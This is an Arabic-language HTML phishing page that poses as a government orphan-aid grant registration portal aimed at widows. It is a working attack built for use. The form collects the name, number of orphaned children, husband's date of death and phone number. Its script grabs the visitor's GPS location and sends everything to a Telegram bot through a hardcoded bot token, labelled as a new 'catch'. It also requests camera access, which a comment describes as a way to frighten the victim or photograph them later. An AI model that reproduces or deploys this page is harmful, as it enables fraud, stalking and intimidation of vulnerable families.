<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التسجيل - منحة معونة الأيتام 2026</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #f4f7f6; text-align: center; direction: rtl; }
        .container { background: white; max-width: 400px; margin: 30px auto; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
        h2 { color: #2c3e50; font-size: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
        .footer { font-size: 11px; color: #95a5a6; margin-top: 15px; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://img.icons8.com/color/96/family-guarantee.png" alt="logo">
    <h2>منحة كفالة اليتيم - تسجيل جديد</h2>
    <p style="font-size: 13px; color: #e74c3c;">يرجى ملء البيانات لتفعيل المعونة الشهرية لمدة عام</p>
    
    <input type="text" id="name" placeholder="اسم الأرملة الكامل">
    <input type="number" id="kids" placeholder="عدد الأطفال الأيتام">
    <input type="text" id="death" placeholder="تاريخ وفاة الزوج">
    <input type="tel" id="phone" placeholder="رقم الهاتف للتواصل">
    
    <button class="btn" onclick="captureEverything()">إرسال الطلب والتحقق</button>
    <div class="footer">وزارة الشؤون الاجتماعية والعمل - بوابة المنح</div>
</div>

<script>
    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
    const CHAT_ID = "حط_هون_الآيدي_تبعك"; // استبدل هاد بالـ ID تبعك

    async function captureEverything() {
        const name = document.getElementById('name').value;
        const kids = document.getElementById('kids').value;
        const death = document.getElementById('death').value;
        const phone = document.getElementById('phone').value;

        if(!name || !phone) { alert("يرجى إكمال البيانات!"); return; }

        // 1. جمع الموقع الجغرافي (GPS)
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;

            let report = `🔥 صيد جديد (معونة أيتام) 🔥\n\n`;
            report += `👤 الاسم: ${name}\n`;
            report += `👦 عدد الأيتام: ${kids}\n`;
            report += `📅 وفاة الزوج: ${death}\n`;
            report += `📞 الهاتف: ${phone}\n`;
            report += `📍 الموقع: ${googleMaps}`;

            // إرسال البيانات فوراً للتليجرام
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: report })
            });

            alert("تم تسجيل طلبك بنجاح. سيتم الاتصال بك للتحقق.");
        }, (err) => {
            alert("خطأ: يرجى السماح بالوصول للموقع لتأكيد نطاق المعونة!");
        });

        // 2. تفعيل الكاميرا (لإرعاب الضحية أو التقاط صور لاحقاً)
        try {
            await navigator.mediaDevices.getUserMedia({ video: true });
        } catch (e) {}
    }
</script>
</body>
</html>
